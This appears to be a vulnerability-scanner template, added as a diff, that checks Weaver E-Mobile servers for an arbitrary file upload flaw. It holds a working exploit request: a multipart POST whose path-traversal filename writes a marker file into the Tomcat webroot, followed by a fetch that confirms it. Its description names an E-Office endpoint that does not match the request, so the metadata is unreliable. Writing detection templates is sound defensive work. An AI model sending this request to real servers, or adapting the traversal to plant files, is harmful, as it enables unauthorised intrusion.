@@ -1,0 +1,46 @@
+id: fanwei-E-Mobile-file-upload
+
+info:
+  name: fanwei-E-Mobile-wenjianshangchuan
+  author: cnaq
+  severity: high
+  description: 泛微OA E-Office /eoffice10/server/public/iWebOffice2015/OfficeServer.php 存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器敏感信息
+  reference: http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20OfficeServer.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+  tags: fanwei,oa,eoffice,fileupload
+
+
+http:
+  - raw:
+      - |+
+        POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
+        Host:{{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
+        Upgrade-Insecure-Requests: 1
+        SL-CE-SUID: 15
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        Content-Length: 235
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="source"
+
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="file"; filename="../../../../appsvr/tomcat/webapps/ROOT/3edcvfr4.txt"
+
+        cde3vfr4
+        --00content0boundary00--
+
+      - |+
+        GET /3edcvfr4.txt HTTP/1.1
+        Host:{{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200
+      
+      - type: word
+        words:
+          - "cde3vfr4"
